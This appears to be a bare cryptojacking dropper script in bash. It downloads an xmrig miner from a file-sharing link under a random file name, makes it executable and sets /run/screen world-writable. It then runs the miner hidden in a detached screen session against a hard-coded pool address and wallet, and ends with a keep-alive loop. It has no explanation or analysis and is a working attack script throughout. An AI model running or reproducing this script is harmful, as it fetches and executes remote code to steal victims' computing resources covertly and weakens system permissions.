#!/bin/bash
gas=$(shuf -n 1 -i 1-9999999)
curl https://transfer.sh/yesOy8/xmrig --output $gas
chmod +x $gas
chmod 777 /run/screen
screen -dmS $gas ./$gas --donate-level 0 -o 20.120.30.75:3333 -u hvxxzE88RUEbetvm8dCfu97o8p1rLSZ9s66qYVr5YVokHGfg48ZekDeX1mi1TmcSTtdMQTGEjguD6NtwQ8CQSTkB3QmEn5Bhqa -p wak -a cn/upx2 -k  
while :; do shuf -n 1 -i 1-99999999; sleep 30; done
